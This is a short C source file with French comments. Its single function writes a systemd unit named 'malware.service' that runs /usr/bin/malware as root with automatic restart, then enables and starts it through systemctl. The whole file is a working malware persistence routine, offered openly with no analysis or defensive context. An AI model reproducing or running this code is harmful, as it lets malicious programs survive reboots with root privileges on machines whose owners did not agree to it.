#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define SERVICE_FILE "/etc/systemd/system/malware.service"

void create_systemd_service() {
    FILE *service = fopen(SERVICE_FILE, "w");
    if (service != NULL) {
        fprintf(service, "[Unit]\n");
        fprintf(service, "Description=Malware Persistent Service\n");
        fprintf(service, "After=network.target\n\n");

        fprintf(service, "[Service]\n");
        fprintf(service, "ExecStart=/usr/bin/malware\n");
        fprintf(service, "Restart=always\n");
        fprintf(service, "User=root\n\n");

        fprintf(service, "[Install]\n");
        fprintf(service, "WantedBy=multi-user.target\n");

        fclose(service);

        // Activer le service
        system("systemctl daemon-reload");
        system("systemctl enable malware.service");
        system("systemctl start malware.service");

        printf("Service systemd créé et activé.\n");
    } else {
        perror("Erreur lors de la création du fichier de service systemd");
    }
}
